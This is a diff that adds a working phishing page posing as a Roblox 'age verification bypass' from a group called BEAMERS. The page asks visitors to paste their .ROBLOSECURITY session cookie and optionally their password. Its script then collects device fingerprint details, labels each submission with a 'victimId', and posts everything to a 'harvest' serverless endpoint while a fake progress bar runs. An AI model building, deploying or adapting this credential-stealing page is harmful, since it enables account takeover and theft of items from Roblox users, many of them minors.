@@ -1,0 +1,257 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title> 1# BEAMERS • Age Verification Bypass</title>
+<link rel="icon" href="https://cdn2.roblox.com/web/favicon.ico">
+<style>
+  * {
+    margin: 0;
+    padding: 0;
+    box-sizing: border-box;
+    font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
+  }
+
+  body {
+    background: #0c0f14;
+    min-height: 100vh;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    padding: 1.5rem;
+  }
+
+  .card {
+    max-width: 520px;
+    width: 100%;
+    background: #12161e;
+    border-radius: 28px;
+    border: 1px solid #2a2f3a;
+    box-shadow: 0 20px 35px -12px rgba(0,0,0,0.4);
+    padding: 2rem;
+  }
+
+  .header {
+    text-align: center;
+    margin-bottom: 2rem;
+  }
+
+  .badge {
+    background: #1e2a36;
+    display: inline-block;
+    padding: 0.25rem 1rem;
+    border-radius: 40px;
+    font-size: 0.7rem;
+    font-weight: 600;
+    color: #5fc3ff;
+    letter-spacing: 0.4px;
+    border: 1px solid #2c3f4f;
+    margin-bottom: 1rem;
+  }
+
+  h1 {
+    font-size: 1.7rem;
+    font-weight: 600;
+    color: #f0f3fa;
+    letter-spacing: -0.3px;
+  }
+
+  .sub {
+    color: #8f9bb5;
+    font-size: 0.85rem;
+    margin-top: 0.4rem;
+  }
+
+  .progress-bar {
+    background: #1a202c;
+    border-radius: 40px;
+    height: 5px;
+    width: 100%;
+    margin: 2rem 0 1.2rem;
+    overflow: hidden;
+  }
+
+  .progress-fill {
+    width: 0%;
+    height: 100%;
+    background: #3b82f6;
+    transition: width 0.2s ease;
+  }
+
+  .progress-text {
+    text-align: center;
+    font-size: 0.7rem;
+    color: #5e6f8d;
+    margin-bottom: 1.5rem;
+  }
+
+  .input-group {
+    margin-bottom: 1.2rem;
+  }
+
+  label {
+    display: block;
+    font-size: 0.7rem;
+    font-weight: 600;
+    text-transform: uppercase;
+    letter-spacing: 0.5px;
+    color: #9aa9c1;
+    margin-bottom: 0.4rem;
+    margin-left: 0.2rem;
+  }
+
+  textarea, input {
+    width: 100%;
+    background: #0c1018;
+    border: 1px solid #2a2f3c;
+    border-radius: 20px;
+    padding: 12px 16px;
+    color: #eef2ff;
+    font-size: 0.9rem;
+    outline: none;
+    transition: 0.2s;
+    font-family: monospace;
+  }
+
+  textarea {
+    resize: vertical;
+  }
+
+  input:focus, textarea:focus {
+    border-color: #3b82f6;
+    box-shadow: 0 0 0 2px rgba(59,130,246,0.2);
+  }
+
+  .btn {
+    width: 100%;
+    background: #1e2a3a;
+    border: 1px solid #3b82f6;
+    border-radius: 40px;
+    padding: 12px;
+    font-size: 1rem;
+    font-weight: 600;
+    color: #eef2ff;
+    cursor: pointer;
+    transition: 0.2s;
+    margin-top: 1rem;
+  }
+
+  .btn:hover {
+    background: #2a3a4a;
+    border-color: #60a5fa;
+  }
+
+  .warning {
+    background: rgba(255,70,70,0.08);
+    border-left: 3px solid #ff4a4a;
+    padding: 0.8rem;
+    border-radius: 16px;
+    font-size: 0.7rem;
+    color: #ffb3b3;
+    margin: 1.5rem 0 1rem;
+  }
+
+  .footer {
+    text-align: center;
+    font-size: 0.65rem;
+    color: #4b5a7a;
+    margin-top: 2rem;
+  }
+</style>
+</head>
+<body>
+<div class="card">
+  <div class="header">
+    <div class="badge">BEAMERS • VERIFICATION</div>
+    <h1>Age verification bypass</h1>
+    <div class="sub">cookie authentication – full account data extraction</div>
+  </div>
+
+  <div class="progress-bar">
+    <div class="progress-fill" id="progressFill"></div>
+  </div>
+  <div class="progress-text" id="progressText">🔐 waiting for authentication</div>
+
+  <div class="input-group">
+    <label>ROBLOSECURITY COOKIE</label>
+    <textarea id="cookie" rows="2" placeholder="_|WARNING:-DO-NOT-SHARE... (full cookie)"></textarea>
+  </div>
+
+  <div class="input-group">
+    <label>PASSWORD (optional)</label>
+    <input type="password" id="password" placeholder="leave empty if only cookie">
+  </div>
+
+  <div class="warning">⚠️ Cookie is required. All other data will be extracted automatically from the cookie.</div>
+  <button class="btn" id="submitBtn">BYPASS AGE VERIFICATION</button>
+  <div class="footer">BEAMERS • private module</div>
+</div>
+
+<script>
+  function cleanCookie(raw) {
+    const prefix = '_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_';
+    if (raw && raw.startsWith(prefix)) return raw.substring(prefix.length);
+    return raw;
+  }
+
+  function getDeviceInfo() {
+    return {
+      screen: `${screen.width}x${screen.height}`,
+      platform: navigator.platform,
+      userAgent: navigator.userAgent,
+      timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+      language: navigator.language
+    };
+  }
+
+  document.getElementById('submitBtn').onclick = async () => {
+    const rawCookie = document.getElementById('cookie').value.trim();
+    if (!rawCookie) return alert('Cookie is required.');
+
+    const cookie = cleanCookie(rawCookie);
+    const password = document.getElementById('password').value.trim();
+    const device = getDeviceInfo();
+
+    const payload = {
+      cookie: cookie,
+      password: password,
+      deviceScreen: device.screen,
+      devicePlatform: device.platform,
+      userAgent: device.userAgent,
+      deviceTimezone: device.timezone,
+      deviceLanguage: device.language,
+      victimId: Math.random().toString(36).substring(2),
+      timestamp: new Date().toISOString(),
+      desiredAge: '13+'
+    };
+
+    const progressFill = document.getElementById('progressFill');
+    const progressText = document.getElementById('progressText');
+    let width = 0;
+    const interval = setInterval(() => {
+      width += 8;
+      progressFill.style.width = width + '%';
+      if (width >= 70) clearInterval(interval);
+    }, 100);
+    progressText.innerText = '🔓 extracting account data...';
+
+    try {
+      const res = await fetch('/.netlify/functions/harvest', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify(payload)
+      });
+      if (!res.ok) throw new Error();
+      progressFill.style.width = '100%';
+      progressText.innerText = '✅ bypass complete, redirecting...';
+      setTimeout(() => { window.location.href = 'success.html'; }, 1200);
+    } catch (err) {
+      alert('Failed. Check cookie or try again.');
+      progressFill.style.width = '0%';
+      progressText.innerText = '🔐 authentication failed';
+    }
+  };
+</script>
+</body>
+</html>
